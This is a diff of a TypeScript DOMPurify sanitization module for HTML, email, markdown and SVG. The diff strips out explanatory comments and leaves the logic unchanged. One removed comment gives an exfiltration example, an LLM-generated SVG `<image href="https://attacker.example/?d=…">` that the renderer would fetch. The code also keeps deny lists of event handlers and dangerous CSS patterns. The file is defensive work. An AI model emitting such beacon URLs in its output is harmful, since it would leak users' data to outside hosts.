@@ -1,19 +1,14 @@
 import DOMPurify, { type Config as DOMPurifyConfig } from 'dompurify';
 
-// AUDIT-007-016/017/018 fix: Register DOMPurify hooks once at module initialization
-// instead of on every sanitize call to avoid memory leaks and performance issues
 let hooksInitialized = false;
 
 function initializeDOMPurifyHooks(): void {
   if (hooksInitialized) return;
   hooksInitialized = true;
 
-  // Hook for sanitizeHtml with allowLinks option
-  // This hook handles anchor tags for all sanitize functions
   DOMPurify.addHook('afterSanitizeAttributes', (node) => {
     if (node.tagName === 'A') {
       const anchor = node as HTMLAnchorElement;
-      // Always add rel for _blank targets
       if (anchor.getAttribute('target') === '_blank') {
         anchor.setAttribute('rel', 'noopener noreferrer');
       }
@@ -21,7 +16,6 @@ function initializeDOMPurifyHooks(): void {
   });
 }
 
-// Initialize hooks on module load
 initializeDOMPurifyHooks();
 
 export function sanitizeHtml(
@@ -32,9 +26,7 @@ export function sanitizeHtml(
     allowLinks?: boolean;
   },
 ): string {
-  // Default allowed attributes as a flat array
   const defaultAllowedAttrs = ['class', 'id'];
-  // If custom attributes are provided, flatten them into a single array
   const allowedAttrs = options?.allowedAttributes
     ? Object.values(options.allowedAttributes).flat()
     : defaultAllowedAttrs;
@@ -84,7 +76,6 @@ export function sanitizeHtml(
 
   const sanitized = DOMPurify.sanitize(html, config);
 
-  // AUDIT-007-016 fix: Post-process to validate href attributes when allowLinks is true
   if (options?.allowLinks) {
     const tempDiv = document.createElement('div');
     tempDiv.innerHTML = sanitized;
@@ -135,9 +126,6 @@ export function sanitizeEmailHtml(html: string): string {
       'img',
       'hr',
     ],
-    // 'style' intentionally excluded: inline CSS can be used for image-beacon
-    // exfiltration (background-image URLs). If layout fidelity is needed,
-    // allow only safe CSS properties via the afterSanitizeAttributes hook instead.
     ALLOWED_ATTR: ['class', 'id', 'href', 'target', 'rel', 'src', 'alt', 'title'],
     ALLOWED_URI_REGEXP:
       /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i,
@@ -146,14 +134,11 @@ export function sanitizeEmailHtml(html: string): string {
     SAFE_FOR_TEMPLATES: true,
   };
 
-  // AUDIT-007-017 fix: Hooks are registered at module initialization
-  // Post-process to apply email-specific anchor and image rules
   const sanitized = DOMPurify.sanitize(html, config);
 
   const tempDiv = document.createElement('div');
   tempDiv.innerHTML = sanitized;
 
-  // Process anchors
   const anchors = tempDiv.querySelectorAll('a');
   anchors.forEach((anchor) => {
     anchor.setAttribute('target', '_blank');
@@ -165,7 +150,6 @@ export function sanitizeEmailHtml(html: string): string {
     }
   });
 
-  // Process images
   const images = tempDiv.querySelectorAll('img');
   images.forEach((img) => {
     const src = img.getAttribute('src');
@@ -214,14 +198,11 @@ export function sanitizeMarkdownHtml(html: string): string {
     SAFE_FOR_TEMPLATES: true,
   };
 
-  // AUDIT-007-018 fix: Hooks are registered at module initialization
-  // Post-process to apply markdown-specific anchor rules
   const sanitized = DOMPurify.sanitize(html, config);
 
   const tempDiv = document.createElement('div');
   tempDiv.innerHTML = sanitized;
 
-  // Process anchors
   const anchors = tempDiv.querySelectorAll('a');
   anchors.forEach((anchor) => {
     anchor.setAttribute('target', '_blank');
@@ -236,13 +217,10 @@ export function sanitizeMarkdownHtml(html: string): string {
   return tempDiv.innerHTML;
 }
 
-// Security hooks for enhanced XSS protection - initialized on module load
 (() => {
-  // Hook 1: Remove event handlers and validate href attributes
   DOMPurify.addHook('afterSanitizeAttributes', (node) => {
     if (!(node instanceof Element)) return;
 
-    // Remove dangerous SVG/HTML event handlers
     const eventHandlers = [
       'onload',
       'onerror',
@@ -272,12 +250,6 @@ export function sanitizeMarkdownHtml(html: string): string {
       }
     }
 
-    // Validate href attributes to prevent javascript: protocol execution.
-    // SEV-DESK-12: SVG <image> elements receive a stricter rule — they are
-    // a known SSRF / data-exfiltration vector when an LLM-generated artifact
-    // contains <image href="https://attacker.example/?d=…" />. The webview
-    // dereferences the URL at render time. Restrict <image> hrefs to
-    // `data:image/*` only; `<a href="https://…">` keeps its broader allow.
     const isSvgImage = node.tagName === 'image' || node.tagName === 'IMAGE';
     const hrefAttributes = ['href', 'xlink:href'];
     for (const attr of hrefAttributes) {
@@ -293,18 +265,14 @@ export function sanitizeMarkdownHtml(html: string): string {
           continue;
         }
         if (isSvgImage && value && !/^data:image\//i.test(value)) {
-          // Strip non-data URLs from <image> — prevents the renderer from
-          // making an outbound request triggered solely by attacker content.
           node.removeAttribute(attr);
         }
       }
     }
 
-    // Sanitize style attribute to prevent CSS injection attacks
     if (node.hasAttribute('style')) {
       const style = node.getAttribute('style');
       if (style) {
-        // Block dangerous CSS patterns
         const dangerousPatterns = [
           'behavior:',
           'expression(',
@@ -351,7 +319,6 @@ export function validateUrl(
 
     const hostname = parsed.hostname.toLowerCase();
 
-    // Always block cloud metadata endpoint (SSRF vector)
     if (/^169\.254\./.test(hostname)) {
       return { valid: false, error: 'Access to link-local addresses is not allowed' };
     }
@@ -482,16 +449,6 @@ export function checkForInjection(input: string): { safe: boolean; type?: string
   return { safe: true };
 }
 
-// The renderer's Content-Security-Policy is not defined here. The three copies
-// that actually reach a browser are `src-tauri/tauri.conf.json` (packaged app),
-// `electron/config.ts` (Electron shell) and `vite.config.ts` (dev server); this
-// module used to carry a fourth, unreferenced copy that had already drifted
-// away from all three (no `https://js.stripe.com`, no `artifact:`, plus hosts
-// the live policies do not grant). Adopting it would have silently broken
-// Stripe and artifact rendering, so it was removed rather than resynced.
-
-// AUDIT-NEW-001 fix: Sanitize SVG content to prevent XSS attacks
-// SVG elements can contain malicious scripts via event handlers, javascript: URLs, etc.
 export function sanitizeSvg(svg: string): string {
   const config: DOMPurifyConfig = {
     ALLOWED_TAGS: [
